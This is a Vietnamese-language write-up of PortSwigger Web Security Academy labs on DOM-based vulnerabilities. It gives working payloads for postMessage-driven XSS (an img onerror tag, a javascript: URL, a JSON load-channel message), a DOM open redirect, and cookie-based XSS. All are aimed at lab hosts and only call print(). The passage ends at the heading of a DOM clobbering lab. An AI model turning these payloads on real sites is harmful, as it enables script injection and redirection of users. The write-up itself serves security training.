## DOM-based vulnerabilities

### Lab: DOM XSS using web messages

>This lab demonstrates a simple web message vulnerability. To solve this lab, use the exploit server to post a message to the target site that causes the print() function to be called.

<img width="880" alt="image" src="https://github.com/rayinaw/ctf-challenges/assets/108481122/9a2d0559-32a1-47e3-83b0-cc5093eb0281">

Vừa vào web đã thấy `[object Object]` in ra. View-source ta thấy đoạn sau:
```html
<!-- Ads to be inserted here -->
<div id='ads'>
</div>
<script>
    window.addEventListener('message', function(e) {
        document.getElementById('ads').innerHTML = e.data;
    })
</script>
```

Đoạn mã này là đoạn mã nhận message từ [postMessage](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) API. `postMessage` là phương thức được tạo ra để giúp cửa sổ tương tác với các iframe. Ở đây không thấy filter gì, do đó ta có thể postMessage đơn giản như sau:
```html
<iframe src="https://0afb001703b1cf5d80dddab600ae0097.web-security-academy.net" id="ifr" onload=send()></iframe>
<script>
function send() {
    ifr.contentWindow.postMessage("<img src=1 onerror=print()>", "*");
}
</script>
```
<img width="908" alt="image" src="https://github.com/rayinaw/ctf-challenges/assets/108481122/22a72c4b-a9c8-466c-86c7-c1f238ef1cb2">

### Lab: DOM XSS using web messages and a JavaScript URL

Tương tự như bài trước, view-source ta thấy đoạn mã sau:
```html
<script>
    window.addEventListener('message', function(e) {
        var url = e.data;
        if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
            location.href = url;
        }
    }, false);
</script>
```

Cũng là postMessage API, Đoạn mã này thực hiện check xem url từ data gửi đến có chứa `http:` hay `https:` không. Nếu có thì set `href = url`.

Payload:
```html
<iframe src="https://0a23001103019b7282738dab00cc001e.web-security-academy.net/" id="ifr" onload=send()></iframe>
<script>
function send() {
    ifr.contentWindow.postMessage("javascript:print()//http:", "*");
}
</script>
```

<img width="911" alt="image" src="https://github.com/rayinaw/ctf-challenges/assets/108481122/91641033-543d-49ab-8123-9123478f2e2d">

### Lab: DOM XSS using web messages and JSON.parse

>This lab uses web messaging and parses the message as JSON. To solve the lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function.

Tương tự, view-source ta thấy đoạn sau:

<img width="604" alt="image" src="https://github.com/rayinaw/ctf-challenges/assets/108481122/5f10493b-2eb0-4f8a-9d62-72f39979dc19">

Nhìn sơ qua thì nó tạo một ACMEplayer chứa iframe rồi truyền data vào. Nhìn vào 3 type ta thấy với type là `load-channel` ta có thể lợi dụng chèn vào url `pseudo-protocol`:

```html
<iframe src="https://0a9a0063030990bf869bbc0800ea00b4.web-security-academy.net/" id="ifr" onload=send()></iframe>
<script>
function send() {
    ifr.contentWindow.postMessage('{"type":"load-channel", "url":"javascript:print()"}', "*");
}
</script>
```

<img width="917" alt="image" src="https://github.com/rayinaw/ctf-challenges/assets/108481122/d2f05569-a791-4b3c-a31c-3c090bd6610e">

### Lab: DOM-based open redirection

> This lab contains a DOM-based open-redirection vulnerability. To solve this lab, exploit this vulnerability and redirect the victim to the exploit server.

Click vào xem các bài đăng, ta thấy đoạn mã của button `Back to Blog` sau:

<img width="904" alt="image" src="https://github.com/rayinaw/ctf-challenges/assets/108481122/52cfec58-b75d-4e4c-8360-d01decaf632c">

Đoạn mã này sẽ check nếu có url để redirect thì sẽ trở về url đó còn không thì trở về "/".

<img width="889" alt="image" src="https://github.com/rayinaw/ctf-challenges/assets/108481122/1ead563c-8c9a-4bcd-9abd-d0bebd4a4c41">

Đề bài yêu cầu hơi lú, chỉ cần enter cái này trên browser là solve XD
```
https://0a980047036c34f0d28e408000f600ab.web-security-academy.net/post?postId=8&url=https://exploit-0aeb002103c93466d2dd3f6101fb0064.exploit-server.net/exploit
```

### Lab: DOM-based cookie manipulations

> This lab demonstrates DOM-based client-side cookie manipulation. To solve this lab, inject a cookie that will cause XSS on a different page and call the print() function. You will need to use the exploit server to direct the victim to the correct pages.

Vào xem sản phẩm, ta thấy đoạn mã sau:

<img width="701" alt="image" src="https://github.com/rayinaw/ctf-challenges/assets/108481122/e80f8d10-74bc-431e-a2e9-c6909af816de">


```html
<script>
    document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
</script>
```

Đoạn mã này sẽ lưu trạng thái sản phẩm gần nhất mà người dùng đã xem để xem lại ở đầu trang:

<img width="908" alt="image" src="https://github.com/rayinaw/ctf-challenges/assets/108481122/6823d023-1b8e-4f95-9d6c-542657866ad8">

<img width="817" alt="image" src="https://github.com/rayinaw/ctf-challenges/assets/108481122/557de8c0-2643-4de9-b804-bc179cf6f811">

`Last viewed product` được set trực tiếp vào href của `<a>` tag từ cookie, do đó ta có thể đóng tag để gây ra xss như sau:

<img width="893" alt="image" src="https://github.com/rayinaw/ctf-challenges/assets/108481122/e8d6b499-dcf0-4eff-aa89-3907f7fd5163">

<img width="913" alt="image" src="https://github.com/rayinaw/ctf-challenges/assets/108481122/ec6ff652-65bd-4838-989e-ecd1c3518731">

Tuy đã chèn được thẻ `<script>` nhưng ta vẫn chưa load DOM lại nên chưa thể trigger xss, do đó bây giờ ta chỉ cần refresh hoặc click vào `Last viewed product` or something else.. là hàm print được thực thi:

<img width="854" alt="image" src="https://github.com/rayinaw/ctf-challenges/assets/108481122/10285fe5-2339-4420-aa45-bb5134b4e944">


Payload:
```html
<iframe src="https://0a8b002e04352530817ecb01001e00cc.web-security-academy.net/product?productId=1&%27%3E%3Cscript%3Eprint()%3C/script%3E%22" onload=refresh() id=if>
<script>
function refresh() {
    if.src = if.src;
}
</script>
```

<img width="895" alt="image" src="https://github.com/rayinaw/ctf-challenges/assets/108481122/fdc5385c-85a8-4470-878e-2352d6b3c9e3">


### Lab: Exploiting DOM clobbering to enable XSS

>This lab contains a DOM-clobbering vulnerability. The comment functionality allows "safe" HTML. To solve this lab, construct an HTML injection that clobbers a variable and uses XSS to call the alert() function.